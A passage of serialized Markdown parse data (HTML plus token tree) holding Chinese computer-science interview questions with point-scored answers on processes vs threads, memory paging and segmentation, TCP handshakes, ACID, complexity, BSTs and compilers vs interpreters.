比特流的传输\\n","task":false,"loose":false,"text":"比特流的传输","tokens":[{"type":"text","raw":"比特流的传输","text":"比特流的传输","tokens":[{"type":"text","raw":"比特流的传输","text":"比特流的传输","escaped":false}]}]},{"type":"list_item","raw":"+ 定义物理媒介、接口和电气特性\\n","task":false,"loose":false,"text":"定义物理媒介、接口和电气特性","tokens":[{"type":"text","raw":"定义物理媒介、接口和电气特性","text":"定义物理媒介、接口和电气特性","tokens":[{"type":"text","raw":"定义物理媒介、接口和电气特性","text":"定义物理媒介、接口和电气特性","escaped":false}]}]},{"type":"list_item","raw":"+ 数据单位：比特","task":false,"loose":false,"text":"数据单位：比特","tokens":[{"type":"text","raw":"数据单位：比特","text":"数据单位：比特","tokens":[{"type":"text","raw":"数据单位：比特","text":"数据单位：比特","escaped":false}]}]}]}]}]}]},{"key":"计算机科学","content":"<h1>计算机科学</h1>\\n<h2>进程与线程的区别</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 资源分配：进程是资源分配的基本单位，拥有独立的地址空间、内存、文件等资源；线程是 CPU 调度的基本单位，共享进程的资源，没有独立的地址空间。</li>\\n<li><strong>1：</strong> 并发性：进程之间的并发性是通过操作系统的调度实现的，切换开销较大；线程之间的并发性是在进程内部实现的，切换开销较小，能更高效地利用 CPU 资源。</li>\\n<li><strong>1：</strong> 独立性：进程具有较高的独立性，一个进程的崩溃一般不会影响其他进程；线程的独立性较差，一个线程的崩溃可能会导致整个进程崩溃。</li>\\n<li><strong>1：</strong> 使用场景：进程适用于需要独立运行、资源隔离的场景，如多个不同的应用程序同时运行; 线程：适用于在一个进程内需要多个执行单元并发执行，且需要共享资源的\\n场景，如 Web 服务器中处理多个并发请求。</li>\\n</ul>\\n<h2>内存管理机制的原理、优点、缺点</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（8 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 内存分页管理机制。</li>\\n<li><strong>1：</strong> 内存分页管理机制原理：将内存和进程的地址空间划分为大小相等的页，进程的逻辑地址由页号和页内偏移量组成。通过页表将逻辑地址转换为物理地址。</li>\\n<li><strong>1：</strong> 内存分页管理机制优点：内存利用率高，减少了内存碎片；便于实现虚拟内存，提高了内存的使用效率。</li>\\n<li><strong>1：</strong> 内存分页管理机制缺点：页表需要占用一定的内存空间，增加了系统开销；页面置换算法可能会带来一定的性能开销。</li>\\n<li><strong>1：</strong> 内存分段管理机制。</li>\\n<li><strong>1：</strong> 内存分段管理机制原理：将进程的地址空间划分为若干个大小不等的段，每个段有自己的段名和段长。通过段表将逻辑地址转换为物理地址。</li>\\n<li><strong>1：</strong> 内存分段管理机制优点：便于程序的模块化设计和共享；可以根据段的实际大小分配内存，减少了内存碎片。</li>\\n<li><strong>1：</strong> 内存分段管理机制缺点：内存管理复杂，段表的维护开销较大；可能会导致内存碎片过多，降低内存利用率。</li>\\n</ul>\\n<h2>TCP 三次握手与四次挥手</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（7 分）</h4>\\n<ul>\\n<li>TCP 三次握手</li>\\n<li><strong>1：</strong> 第一次握手：客户端发送一个 SYN（同步）报文段，其中包含客户端的初始序列号seq=x，表示客户端请求建立连接。</li>\\n<li><strong>1：</strong> 第二次握手：服务器收到客户端的 SYN 报文段后，发送一个 SYN+ACK 报文段，其中ack=x+1表示对客户端序列号的确认，seq=y是服务器的初始序列号，表示服\\n务器同意建立连接。</li>\\n<li><strong>1：</strong> 第三次握手：客户端收到服务器的 SYN+ACK 报文段后，发送一个 ACK 报文段，其中ack=y+1表示对服务器序列号的确认，seq=x+1，表示客户端连接建立成\\n功。此时，双方都确认连接已建立，可以开始数据传输。</li>\\n<li>TCP 四次挥手</li>\\n<li><strong>1：</strong> 第一次挥手：主动关闭方（假设为客户端）发送一个 FIN（结束）报文段，其中seq=u，表示客户端请求关闭连接。</li>\\n<li><strong>1：</strong> 第二次挥手：服务器收到客户端的 FIN 报文段后，发送一个 ACK 报文段，其中ack=u+1，seq=v，表示服务器确认收到客户端的关闭请求，但服务器可能还有数据\\n未发送完，所以先不关闭连接。</li>\\n<li><strong>1：</strong> 第三次挥手：当服务器数据发送完后，发送一个 FIN 报文段，其中seq=w，ack=u+1，表示服务器请求关闭连接。</li>\\n<li><strong>1：</strong> 第四次挥手：客户端收到服务器的 FIN 报文段后，发送一个 ACK 报文段，其中ack=w+1，seq=u+1，表示客户端确认收到服务器的关闭请求，此时客户端等待一段\\n时间（2MSL）后关闭连接，服务器收到 ACK 报文段后也关闭连接。</li>\\n</ul>\\n<h2>请解释数据库事务的 ACID 特性</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 原子性（Atomicity）：事务是一个不可分割的工作单位，事务中的操作要么全部成功，要么全部失败回滚。</li>\\n<li><strong>1：</strong> 一致性（Consistency）：事务执行前后，数据库的完整性约束没有被破坏。例如，在一个订单系统中，订单总金额必须等于所有商品金额之和，当对订单进行修改\\n时，事务要确保这个一致性始终成立。</li>\\n<li><strong>1：</strong> 隔离性（Isolation）：多个事务并发执行时，一个事务的执行不能被其他事务干扰。不同的隔离级别（如读未提交、读已提交、可重复读、串行化）决定了事务之\\n间的隔离程度。例如，在可重复读隔离级别下，一个事务在两次读取同一数据时，即使期间有其他事务对该数据进行了修改，第一次读取的数据依然不变，避免了不可重复读问题。</li>\\n<li><strong>1：</strong> 持久性（Durability）：一旦事务提交，它对数据库的修改就应该永久保存下来。即使系统崩溃或出现其他故障，已提交的事务也不会丢失。例如，用户提交了一个订\\n单，即使在保存订单数据后系统马上崩溃，当系统恢复后，该订单数据依然存在。</li>\\n</ul>\\n<h2>什么是代码的时间复杂度和空间复杂度</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（9 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>1：</strong> 时间复杂度和空间复杂度是衡量算法效率的两个重要指标</li>\\n<li><strong>1：</strong> 时间复杂度：用于描述算法执行所需的时间随输入规模增长的变化趋势。它主要关注算法中执行的基本操作次数。</li>\\n<li><strong>1：</strong> 常数时间复杂度：无论输入规模如何变化，算法执行的时间都是固定的。例如，从数组中获取指定下标的元素，无论数组大小是多少，获取操作的时间基本相同。</li>\\n</ul>\\n<pre><code class=\\"language-python\\">def get_element(arr, index):\\n    return arr[index]\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> 线性时间复杂度：算法执行时间与输入规模成正比。例如，遍历一个数组，对每个元素进行一次操作，操作次数随数组长度 n 线性增长。</li>\\n</ul>\\n<pre><code class=\\"language-python\\">def sum_array(arr):\\n    total = 0\\n    for num in arr:\\n        total += num\\n    return total\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> 平方时间复杂度：常见于嵌套循环，算法执行时间与输入规模的平方成正比。例如，冒泡排序算法，其时间复杂度为 O (n²)，因为它包含两层嵌套循环，对于长度为 n 的\\n数组，总的比较次数为 n*(n - 1)/2。</li>\\n</ul>\\n<pre><code class=\\"language-python\\">def bubble_sort(arr):\\n    n = len(arr)\\n    for i in range(n):\\n        for j in range(0, n - i - 1):\\n            if arr[j] &gt; arr[j + 1]:\\n                arr[j], arr[j + 1] = arr[j + 1], arr[j]\\n    return arr\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> 空间复杂度：用于描述算法执行过程中所需的额外空间随输入规模增长的变化趋势。它主要关注算法在运行过程中创建的临时变量、数据结构等所占用的空间。</li>\\n<li><strong>1：</strong> 常数空间复杂度：算法执行过程中所需的额外空间是固定的，不随输入规模变化。例如，计算两个整数之和的函数，除了输入参数和返回值，没有使用额外的与输入规模相关的空间。</li>\\n</ul>\\n<pre><code class=\\"language-python\\">def add_numbers(a, b):\\n    return a + b\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> 线性空间复杂度：算法执行过程中所需的额外空间与输入规模成正比。例如，创建一个长度为 n 的数组来存储数据，其空间复杂度为 O (n)。</li>\\n</ul>\\n<pre><code class=\\"language-python\\">def create_array(n):\\n    return [0] * n\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> 平方空间复杂度：常见于创建二维数组等情况，例如创建一个 n×n 的二维数组，其空间复杂度为 O (n²)。</li>\\n</ul>\\n<pre><code class=\\"language-python\\">def create_2d_array(n):\\n    return [[0] * n for _ in range(n)]\\n</code></pre>\\n</details>\\n\\n<h2>什么是二叉搜索树（BST）</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 二叉搜索树是一种二叉树，对于树中的每个节点，其左子树的所有节点值都小于该节点值，右子树的所有节点值都大于该节点值。这种特性使得在二叉搜索树上进行查\\n找、插入和删除操作的平均时间复杂度为 O (log n)，n 为节点数。</li>\\n</ul>\\n<h2>简述编译器和解释器的区别</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 编译器会将源程序一次性全部翻译成目标机器可执行的机器语言，如 C、C++ 等语言通过编译器编译后生成可执行文件。解释器则是逐行读取源程序，边解释边执行，并不生成\\n目标程序，如 Python 语言默认通过解释器运行代码。</li>\\n</ul>\\n","ast":[{"type":"heading","raw":"# 计算机科学\\n\\n","depth":1,"text":"计算机科学","tokens":[{"type":"text","raw":"计算机科学","text":"计算机科学","escaped":false}]},{"type":"heading","raw":"## 进程与线程的区别\\n\\n","depth":2,"text":"进程与线程的区别","tokens":[{"type":"text","raw":"进程与线程的区别","text":"进程与线程的区别","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"- **1：** 资源分配：进程是资源分配的基本单位，拥有独立的地址空间、内存、文件等资源；线程是 CPU 调度的基本单位，共享进程的资源，没有独立的地址空间。\\n- **1：** 并发性：进程之间的并发性是通过操作系统的调度实现的，切换开销较大；线程之间的并发性是在进程内部实现的，切换开销较小，能更高效地利用 CPU 资源。\\n- **1：** 独立性：进程具有较高的独立性，一个进程的崩溃一般不会影响其他进程；线程的独立性较差，一个线程的崩溃可能会导致整个进程崩溃。\\n- **1：** 使用场景：进程适用于需要独立运行、资源隔离的场景，如多个不同的应用程序同时运行; 线程：适用于在一个进程内需要多个执行单元并发执行，且需要共享资源的\\n场景，如 Web 服务器中处理多个并发请求。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 资源分配：进程是资源分配的基本单位，拥有独立的地址空间、内存、文件等资源；线程是 CPU 调度的基本单位，共享进程的资源，没有独立的地址空间。\\n","task":false,"loose":false,"text":"**1：** 资源分配：进程是资源分配的基本单位，拥有独立的地址空间、内存、文件等资源；线程是 CPU 调度的基本单位，共享进程的资源，没有独立的地址空间。","tokens":[{"type":"text","raw":"**1：** 资源分配：进程是资源分配的基本单位，拥有独立的地址空间、内存、文件等资源；线程是 CPU 调度的基本单位，共享进程的资源，没有独立的地址空间。","text":"**1：** 资源分配：进程是资源分配的基本单位，拥有独立的地址空间、内存、文件等资源；线程是 CPU 调度的基本单位，共享进程的资源，没有独立的地址空间。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 资源分配：进程是资源分配的基本单位，拥有独立的地址空间、内存、文件等资源；线程是 CPU 调度的基本单位，共享进程的资源，没有独立的地址空间。","text":" 资源分配：进程是资源分配的基本单位，拥有独立的地址空间、内存、文件等资源；线程是 CPU 调度的基本单位，共享进程的资源，没有独立的地址空间。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 并发性：进程之间的并发性是通过操作系统的调度实现的，切换开销较大；线程之间的并发性是在进程内部实现的，切换开销较小，能更高效地利用 CPU 资源。\\n","task":false,"loose":false,"text":"**1：** 并发性：进程之间的并发性是通过操作系统的调度实现的，切换开销较大；线程之间的并发性是在进程内部实现的，切换开销较小，能更高效地利用 CPU 资源。","tokens":[{"type":"text","raw":"**1：** 并发性：进程之间的并发性是通过操作系统的调度实现的，切换开销较大；线程之间的并发性是在进程内部实现的，切换开销较小，能更高效地利用 CPU 资源。","text":"**1：** 并发性：进程之间的并发性是通过操作系统的调度实现的，切换开销较大；线程之间的并发性是在进程内部实现的，切换开销较小，能更高效地利用 CPU 资源。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 并发性：进程之间的并发性是通过操作系统的调度实现的，切换开销较大；线程之间的并发性是在进程内部实现的，切换开销较小，能更高效地利用 CPU 资源。","text":" 并发性：进程之间的并发性是通过操作系统的调度实现的，切换开销较大；线程之间的并发性是在进程内部实现的，切换开销较小，能更高效地利用 CPU 资源。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 独立性：进程具有较高的独立性，一个进程的崩溃一般不会影响其他进程；线程的独立性较差，一个线程的崩溃可能会导致整个进程崩溃。\\n","task":false,"loose":false,"text":"**1：** 独立性：进程具有较高的独立性，一个进程的崩溃一般不会影响其他进程；线程的独立性较差，一个线程的崩溃可能会导致整个进程崩溃。","tokens":[{"type":"text","raw":"**1：** 独立性：进程具有较高的独立性，一个进程的崩溃一般不会影响其他进程；线程的独立性较差，一个线程的崩溃可能会导致整个进程崩溃。","text":"**1：** 独立性：进程具有较高的独立性，一个进程的崩溃一般不会影响其他进程；线程的独立性较差，一个线程的崩溃可能会导致整个进程崩溃。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 独立性：进程具有较高的独立性，一个进程的崩溃一般不会影响其他进程；线程的独立性较差，一个线程的崩溃可能会导致整个进程崩溃。","text":" 独立性：进程具有较高的独立性，一个进程的崩溃一般不会影响其他进程；线程的独立性较差，一个线程的崩溃可能会导致整个进程崩溃。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 使用场景：进程适用于需要独立运行、资源隔离的场景，如多个不同的应用程序同时运行; 线程：适用于在一个进程内需要多个执行单元并发执行，且需要共享资源的\\n场景，如 Web 服务器中处理多个并发请求。","task":false,"loose":false,"text":"**1：** 使用场景：进程适用于需要独立运行、资源隔离的场景，如多个不同的应用程序同时运行; 线程：适用于在一个进程内需要多个执行单元并发执行，且需要共享资源的\\n场景，如 Web 服务器中处理多个并发请求。","tokens":[{"type":"text","raw":"**1：** 使用场景：进程适用于需要独立运行、资源隔离的场景，如多个不同的应用程序同时运行; 线程：适用于在一个进程内需要多个执行单元并发执行，且需要共享资源的\\n\\n场景，如 Web 服务器中处理多个并发请求。","text":"**1：** 使用场景：进程适用于需要独立运行、资源隔离的场景，如多个不同的应用程序同时运行; 线程：适用于在一个进程内需要多个执行单元并发执行，且需要共享资源的\\n场景，如 Web 服务器中处理多个并发请求。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用场景：进程适用于需要独立运行、资源隔离的场景，如多个不同的应用程序同时运行; 线程：适用于在一个进程内需要多个执行单元并发执行，且需要共享资源的\\n场景，如 Web 服务器中处理多个并发请求。","text":" 使用场景：进程适用于需要独立运行、资源隔离的场景，如多个不同的应用程序同时运行; 线程：适用于在一个进程内需要多个执行单元并发执行，且需要共享资源的\\n场景，如 Web 服务器中处理多个并发请求。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 内存管理机制的原理、优点、缺点\\n\\n","depth":2,"text":"内存管理机制的原理、优点、缺点","tokens":[{"type":"text","raw":"内存管理机制的原理、优点、缺点","text":"内存管理机制的原理、优点、缺点","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（8 分）\\n\\n","depth":4,"text":"解答（8 分）","tokens":[{"type":"text","raw":"解答（8 分）","text":"解答（8 分）","escaped":false}]},{"type":"list","raw":"- **1：** 内存分页管理机制。\\n- **1：** 内存分页管理机制原理：将内存和进程的地址空间划分为大小相等的页，进程的逻辑地址由页号和页内偏移量组成。通过页表将逻辑地址转换为物理地址。\\n- **1：** 内存分页管理机制优点：内存利用率高，减少了内存碎片；便于实现虚拟内存，提高了内存的使用效率。\\n- **1：** 内存分页管理机制缺点：页表需要占用一定的内存空间，增加了系统开销；页面置换算法可能会带来一定的性能开销。\\n- **1：** 内存分段管理机制。\\n- **1：** 内存分段管理机制原理：将进程的地址空间划分为若干个大小不等的段，每个段有自己的段名和段长。通过段表将逻辑地址转换为物理地址。\\n- **1：** 内存分段管理机制优点：便于程序的模块化设计和共享；可以根据段的实际大小分配内存，减少了内存碎片。\\n- **1：** 内存分段管理机制缺点：内存管理复杂，段表的维护开销较大；可能会导致内存碎片过多，降低内存利用率。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 内存分页管理机制。\\n","task":false,"loose":false,"text":"**1：** 内存分页管理机制。","tokens":[{"type":"text","raw":"**1：** 内存分页管理机制。","text":"**1：** 内存分页管理机制。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 内存分页管理机制。","text":" 内存分页管理机制。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 内存分页管理机制原理：将内存和进程的地址空间划分为大小相等的页，进程的逻辑地址由页号和页内偏移量组成。通过页表将逻辑地址转换为物理地址。\\n","task":false,"loose":false,"text":"**1：** 内存分页管理机制原理：将内存和进程的地址空间划分为大小相等的页，进程的逻辑地址由页号和页内偏移量组成。通过页表将逻辑地址转换为物理地址。","tokens":[{"type":"text","raw":"**1：** 内存分页管理机制原理：将内存和进程的地址空间划分为大小相等的页，进程的逻辑地址由页号和页内偏移量组成。通过页表将逻辑地址转换为物理地址。","text":"**1：** 内存分页管理机制原理：将内存和进程的地址空间划分为大小相等的页，进程的逻辑地址由页号和页内偏移量组成。通过页表将逻辑地址转换为物理地址。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 内存分页管理机制原理：将内存和进程的地址空间划分为大小相等的页，进程的逻辑地址由页号和页内偏移量组成。通过页表将逻辑地址转换为物理地址。","text":" 内存分页管理机制原理：将内存和进程的地址空间划分为大小相等的页，进程的逻辑地址由页号和页内偏移量组成。通过页表将逻辑地址转换为物理地址。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 内存分页管理机制优点：内存利用率高，减少了内存碎片；便于实现虚拟内存，提高了内存的使用效率。\\n","task":false,"loose":false,"text":"**1：** 内存分页管理机制优点：内存利用率高，减少了内存碎片；便于实现虚拟内存，提高了内存的使用效率。","tokens":[{"type":"text","raw":"**1：** 内存分页管理机制优点：内存利用率高，减少了内存碎片；便于实现虚拟内存，提高了内存的使用效率。","text":"**1：** 内存分页管理机制优点：内存利用率高，减少了内存碎片；便于实现虚拟内存，提高了内存的使用效率。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 内存分页管理机制优点：内存利用率高，减少了内存碎片；便于实现虚拟内存，提高了内存的使用效率。","text":" 内存分页管理机制优点：内存利用率高，减少了内存碎片；便于实现虚拟内存，提高了内存的使用效率。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 内存分页管理机制缺点：页表需要占用一定的内存空间，增加了系统开销；页面置换算法可能会带来一定的性能开销。\\n","task":false,"loose":false,"text":"**1：** 内存分页管理机制缺点：页表需要占用一定的内存空间，增加了系统开销；页面置换算法可能会带来一定的性能开销。","tokens":[{"type":"text","raw":"**1：** 内存分页管理机制缺点：页表需要占用一定的内存空间，增加了系统开销；页面置换算法可能会带来一定的性能开销。","text":"**1：** 内存分页管理机制缺点：页表需要占用一定的内存空间，增加了系统开销；页面置换算法可能会带来一定的性能开销。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 内存分页管理机制缺点：页表需要占用一定的内存空间，增加了系统开销；页面置换算法可能会带来一定的性能开销。","text":" 内存分页管理机制缺点：页表需要占用一定的内存空间，增加了系统开销；页面置换算法可能会带来一定的性能开销。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 内存分段管理机制。\\n","task":false,"loose":false,"text":"**1：** 内存分段管理机制。","tokens":[{"type":"text","raw":"**1：** 内存分段管理机制。","text":"**1：** 内存分段管理机制。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 内存分段管理机制。","text":" 内存分段管理机制。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 内存分段管理机制原理：将进程的地址空间划分为若干个大小不等的段，每个段有自己的段名和段长。通过段表将逻辑地址转换为物理地址。\\n","task":false,"loose":false,"text":"**1：** 内存分段管理机制原理：将进程的地址空间划分为若干个大小不等的段，每个段有自己的段名和段长。通过段表将逻辑地址转换为物理地址。","tokens":[{"type":"text","raw":"**1：** 内存分段管理机制原理：将进程的地址空间划分为若干个大小不等的段，每个段有自己的段名和段长。通过段表将逻辑地址转换为物理地址。","text":"**1：** 内存分段管理机制原理：将进程的地址空间划分为若干个大小不等的段，每个段有自己的段名和段长。通过段表将逻辑地址转换为物理地址。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 内存分段管理机制原理：将进程的地址空间划分为若干个大小不等的段，每个段有自己的段名和段长。通过段表将逻辑地址转换为物理地址。","text":" 内存分段管理机制原理：将进程的地址空间划分为若干个大小不等的段，每个段有自己的段名和段长。通过段表将逻辑地址转换为物理地址。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 内存分段管理机制优点：便于程序的模块化设计和共享；可以根据段的实际大小分配内存，减少了内存碎片。\\n","task":false,"loose":false,"text":"**1：** 内存分段管理机制优点：便于程序的模块化设计和共享；可以根据段的实际大小分配内存，减少了内存碎片。","tokens":[{"type":"text","raw":"**1：** 内存分段管理机制优点：便于程序的模块化设计和共享；可以根据段的实际大小分配内存，减少了内存碎片。","text":"**1：** 内存分段管理机制优点：便于程序的模块化设计和共享；可以根据段的实际大小分配内存，减少了内存碎片。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 内存分段管理机制优点：便于程序的模块化设计和共享；可以根据段的实际大小分配内存，减少了内存碎片。","text":" 内存分段管理机制优点：便于程序的模块化设计和共享；可以根据段的实际大小分配内存，减少了内存碎片。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 内存分段管理机制缺点：内存管理复杂，段表的维护开销较大；可能会导致内存碎片过多，降低内存利用率。","task":false,"loose":false,"text":"**1：** 内存分段管理机制缺点：内存管理复杂，段表的维护开销较大；可能会导致内存碎片过多，降低内存利用率。","tokens":[{"type":"text","raw":"**1：** 内存分段管理机制缺点：内存管理复杂，段表的维护开销较大；可能会导致内存碎片过多，降低内存利用率。","text":"**1：** 内存分段管理机制缺点：内存管理复杂，段表的维护开销较大；可能会导致内存碎片过多，降低内存利用率。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 内存分段管理机制缺点：内存管理复杂，段表的维护开销较大；可能会导致内存碎片过多，降低内存利用率。","text":" 内存分段管理机制缺点：内存管理复杂，段表的维护开销较大；可能会导致内存碎片过多，降低内存利用率。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## TCP 三次握手与四次挥手\\n\\n","depth":2,"text":"TCP 三次握手与四次挥手","tokens":[{"type":"text","raw":"TCP 三次握手与四次挥手","text":"TCP 三次握手与四次挥手","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（7 分）\\n\\n","depth":4,"text":"解答（7 分）","tokens":[{"type":"text","raw":"解答（7 分）","text":"解答（7 分）","escaped":false}]},{"type":"list","raw":"- TCP 三次握手\\n- **1：** 第一次握手：客户端发送一个 SYN（同步）报文段，其中包含客户端的初始序列号seq=x，表示客户端请求建立连接。\\n- **1：** 第二次握手：服务器收到客户端的 SYN 报文段后，发送一个 SYN+ACK 报文段，其中ack=x+1表示对客户端序列号的确认，seq=y是服务器的初始序列号，表示服\\n务器同意建立连接。\\n- **1：** 第三次握手：客户端收到服务器的 SYN+ACK 报文段后，发送一个 ACK 报文段，其中ack=y+1表示对服务器序列号的确认，seq=x+1，表示客户端连接建立成\\n功。此时，双方都确认连接已建立，可以开始数据传输。\\n- TCP 四次挥手\\n- **1：** 第一次挥手：主动关闭方（假设为客户端）发送一个 FIN（结束）报文段，其中seq=u，表示客户端请求关闭连接。\\n- **1：** 第二次挥手：服务器收到客户端的 FIN 报文段后，发送一个 ACK 报文段，其中ack=u+1，seq=v，表示服务器确认收到客户端的关闭请求，但服务器可能还有数据\\n未发送完，所以先不关闭连接。\\n- **1：** 第三次挥手：当服务器数据发送完后，发送一个 FIN 报文段，其中seq=w，ack=u+1，表示服务器请求关闭连接。\\n- **1：** 第四次挥手：客户端收到服务器的 FIN 报文段后，发送一个 ACK 报文段，其中ack=w+1，seq=u+1，表示客户端确认收到服务器的关闭请求，此时客户端等待一段\\n时间（2MSL）后关闭连接，服务器收到 ACK 报文段后也关闭连接。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- TCP 三次握手\\n","task":false,"loose":false,"text":"TCP 三次握手","tokens":[{"type":"text","raw":"TCP 三次握手","text":"TCP 三次握手","tokens":[{"type":"text","raw":"TCP 